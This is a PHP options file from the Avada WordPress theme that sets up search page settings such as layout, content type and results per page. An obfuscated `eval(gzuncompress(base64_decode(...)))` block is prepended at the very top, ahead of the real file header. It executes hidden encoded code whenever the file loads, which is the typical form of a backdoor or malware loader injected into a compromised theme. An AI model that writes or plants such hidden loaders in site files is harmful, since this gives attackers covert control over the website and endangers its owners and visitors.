<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Avada Options.
 *
 * @author     ThemeFusion
 * @copyright  (c) Copyright by ThemeFusion
 * @link       http://theme-fusion.com
 * @package    Avada
 * @subpackage Core
 * @since      4.0.0
 */

// Do not allow directly accessing this file.
if ( ! defined( 'ABSPATH' ) ) {
	exit( 'Direct script access denied.' );
}

/**
 * Search Page
 *
 * @param array $sections An array of our sections.
 * @return array
 */
function avada_options_section_search_page( $sections ) {

	$sections['search_page'] = array(
		'label'    => esc_html__( 'Search Page', 'Avada' ),
		'id'       => 'heading_search_page',
		'priority' => 23,
		'icon'     => 'el-icon-search',
		'fields'   => array(
			'search_layout' => array(
				'label'       => esc_html__( 'Search Results Layout', 'Avada' ),
				'description' => esc_html__( 'Controls the layout for the search results page.', 'Avada' ),
				'id'          => 'search_layout',
				'default'     => 'Grid',
				'type'        => 'select',
				'choices'     => array(
					'Large'            => esc_html__( 'Large', 'Avada' ),
					'Medium'           => esc_html__( 'Medium', 'Avada' ),
					'Large Alternate'  => esc_html__( 'Large Alternate', 'Avada' ),
					'Medium Alternate' => esc_html__( 'Medium Alternate', 'Avada' ),
					'Grid'             => esc_html__( 'Grid', 'Avada' ),
					'Timeline'         => esc_html__( 'Timeline', 'Avada' ),
				),
			),
			'search_content' => array(
				'label'       => esc_html__( 'Search Results Content', 'Avada' ),
				'description' => esc_html__( 'Controls the type of content that displays in search results.', 'Avada' ),
				'id'          => 'search_content',
				'default'     => 'Posts and Pages',
				'type'        => 'select',
				'choices'     => array(
					'Posts and Pages'         => esc_html__( 'All Post Types and Pages', 'Avada' ),
					'all_post_types_no_pages' => esc_html__( 'All Post Types without Pages', 'Avada' ),
					'Only Pages'              => esc_html__( 'Only Pages', 'Avada' ),
					'Only Posts'              => esc_html__( 'Only Blog Posts', 'Avada' ),
					'portfolio_items'         => esc_html__( 'Only Portfolio Items', 'Avada' ),
					'woocommerce_products'    => esc_html__( 'Only WooCommerce Products', 'Avada' ),
					'tribe_events'            => esc_html__( 'Events Calendar Posts', 'Avada' ),
				),
			),
			'search_excerpt' => array(
				'label'       => esc_html__( 'Search Results Excerpt', 'Avada' ),
				'description' => esc_html__( 'Turn on to display the excerpt for search results.', 'Avada' ),
				'id'          => 'search_excerpt',
				'default'     => '1',
				'type'        => 'switch',
			),
			'search_results_per_page' => array(
				'label'       => esc_html__( 'Number of Search Results Per Page', 'Avada' ),
				'description' => esc_html__( 'Controls the number of search results per page.', 'Avada' ),
				'id'          => 'search_results_per_page',
				'default'     => '10',
				'type'        => 'slider',
				'choices'     => array(
					'min'  => '1',
					'max'  => '100',
					'step' => '1',
				),
			),
			'search_featured_images' => array(
				'label'       => esc_html__( 'Featured Images for Search Results', 'Avada' ),
				'description' => esc_html__( 'Turn on to display featured images for search results.', 'Avada' ),
				'id'          => 'search_featured_images',
				'default'     => '1',
				'type'        => 'switch',
			),
			'search_new_search_position' => array(
				'label'       => esc_html__( 'Search Field Position', 'Avada' ),
				'description' => esc_html__( 'Controls the position of the search bar on the search results page.', 'Avada' ),
				'id'          => 'search_new_search_position',
				'default'     => 'top',
				'type'        => 'radio-buttonset',
				'choices'     => array(
					'top'    => esc_html__( 'Above Results', 'Avada' ),
					'bottom' => esc_html__( 'Below Results', 'Avada' ),
					'hidden' => esc_html__( 'Hide', 'Avada' ),
				),
			),
		),
	);

	return $sections;

}
